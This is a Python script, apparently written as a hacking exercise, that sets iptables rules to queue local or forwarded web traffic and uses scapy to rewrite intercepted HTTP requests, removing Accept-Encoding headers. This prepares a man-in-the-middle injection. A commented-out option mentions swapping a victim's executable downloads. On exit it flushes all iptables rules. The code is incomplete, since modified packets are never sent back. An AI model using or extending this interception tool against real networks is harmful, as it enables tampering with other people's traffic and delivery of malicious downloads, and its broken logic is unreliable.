#!/usr/bin/env python

import netfilterqueue
import scapy.all as sc
import subprocess
import argparse
import re

#Accept-Encoding: gzip, deflate in http request spits outs '\xff\x00\xff\xff\xff\x00\xff\xff\xff' raw data
#we'll use regex to modify zipped html content
#Accept-Encoding:.*?\\r\\n //matches up to carriage return and first newline




'''
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url-download',dest='url',help='Enter url to a executable download link to replace with target download')
    options = parser.parse_args()
    return options
opt = get_args()
'''

def iptable_conf():
    pipecmd_lm = 'iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001' 
    pipecmd_rh = 'iptables -I FORWARD -j NFQUEUE --queue-num 1001'
    pipecmd_ap = 'service apache2 start'
    input_checker = False
    while input_checker == False:
        input1 = input('Enter \'L\' to capture web traffic from a local machine or \'R\' for a remote machine\n:')
        if input1 == 'L':
            print("Local host chosen")
            input_checker = True
            return subprocess.check_output(pipecmd_lm,shell=True)
        if input1 == 'R':
            print("Remote host chosen")
            input_checker = True
            return subprocess.check_output(pipecmd_rh,shell=True), subprocess.check_output(pipecmd_ap,shell=True)


def set_load(rpkt,load):
    rpkt[sc.Raw].load = load
    del rpkt[sc.IP].len    
    del rpkt[sc.IP].chksum
    del rpkt[sc.TCP].chksum
    return rpkt


def process_packet(pkt):
    sc_pkt = sc.IP(pkt.get_payload())
    if sc_pkt.haslayer(sc.TCP):
        if sc_pkt.haslayer(sc.Raw):
            if sc_pkt[sc.TCP].dport == 80:
                load = sc_pkt[sc.Raw].load
                print('[+] HTTP Request')
                change_load = re.sub("Accept-Encoding:.*?\\r\\n",'',load) #replaces with null string, use our function set_load to modify load 
                new_sc_pkt = set_load(sc_pkt,change_load) 
            elif sc_pkt[sc.TCP].sport == 80: 
                print('[+] HTTP Response')
                #print(sc_pkt.show())

                
    pkt.accept()


try:
    iptable_conf()
    print("iptables configured")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1001, process_packet)
    queue.run()
    
    
except KeyboardInterrupt:
    subprocess.check_output('iptables -F',shell=True)
    print('\niptables flushed')
